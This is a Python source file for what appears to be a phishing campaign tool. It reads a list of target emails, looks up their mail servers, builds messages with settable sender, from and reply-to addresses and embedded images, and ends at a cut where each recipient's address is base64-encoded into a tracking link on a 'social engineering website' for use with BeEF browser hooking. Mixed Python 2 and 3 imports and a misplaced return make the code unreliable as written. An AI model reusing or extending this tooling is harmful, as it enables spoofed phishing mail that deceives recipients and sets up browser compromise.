import smtplib
import base64
import os, sys
import getopt
import urllib.request as urllib2
import urllib
import re 
import socket
import time
import itertools
import urlparse
from bs4 import BeautifulSoup
import DNS
from email.mime.multipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage
from datetime import datetime

class sendEmails:

    def __init__(self):
        self.FROM_ADRESS = None
        self.MAIL_FROM_ADRESS = None
        self.REPLY_TO_ADRESS = None
        self.SUBJECT = 'Test'
        self.filemail = 'emails.txt'
        self.filebody = 'body.txt'
        self.delay = 3
        self.limit = 50
        self.Discovered = {}
        self.emailSent = []
        self.emailFail = []
        self.google = False
        self.guser = 'test'
        self.gpass = 'test'
        self.MAIL_SERVER = None
        self.Beef = False
        self.verbose = False
        self.output = False
        self.socEngWebsite = ''

    def getWebServer(self):
        webserver = self.socEngWebsite
        return webserver

    def discoverSMTP(self, domain):
        DNS.DiscoverNameServers()
        mx_hosts = DNS.mxlookup(domain)
        return mx_hosts

    def checkEmail(self, emails):
        for email in emails:
            if not re.match(r"([a-zA-Z\.\-\_0-9]+)\@([a-zA-Z\.\-\_0-9]+)\.([a-z]+)", email):
                print("Error: " + email + "is not a valid email!")
                print("Check" + self.filemail)
                exit()

    def discoveredDomain(self, emails):
        for email in emails:
            domain = email.split('@')[1]
            if domain not in self.Discovered:
                self.Discovered[domain] = self.discoverSMTP(domain)
            return self.Discovered

    def removePictures(self, pict):
        for i in enumerate(pict):
            os.remove('image' + str(i) + '.jpg')

    def createMail(self, email):
        FROM_ADRESS = self.FROM_ADRESS
        MAIL_FROM_ADRESS = self.MAIL_FROM_ADRESS
        SUBJECT = self.SUBJECT
        REPLY_TO_ADRESS = self.REPLY_TO_ADRESS
        filemail = self.filemail

        webserverLog = datetime.now().strftime("%d_%m_%Y_%H:%M")
        try:
            fb = open(self.filebody, 'rb')
        except IOError:
            print(self.filebody + 'Not Found')

        body = fb.read()
        webserver = self.getWebServer()
        msg = MIMEMultipart('related')
        msg['mail from'] = FROM_ADRESS
        msg['from'] = MAIL_FROM_ADRESS
        msg['subject'] = SUBJECT
        msg['reply-to'] = REPLY_TO_ADRESS
        msg['to'] = email
        msg.preamble = 'This is a multi-part message in MIME format'
        msgAlt = MIMEMultipart('alternative')
        msg.attach(msgAlt)
        msgText = MIMEText('This is the alternative plain text message')
        msgAlt.attach(msgText)
        html = BeautifulSoup(body, "lxml")
        pict = []
        for i,x in enumerate(html.findAll('img')):
            picname = 'image' + str(i) + '.jpg'
            try:
                ft = open(picname, 'rb')
            except IOError:
                print("Downloaded " + picname)
                ft = open(picname, "rb")
            pict.append(MIMEImage(ft.read()))
            ft.close()
            body = body.replace(x['src'].encode('utf-8'), 'cid:image' + str(i))

        if self.Beef : url = webserver + "/index.php?e=" + base64.b64encode(email).rstrip("=") + "&b=1" 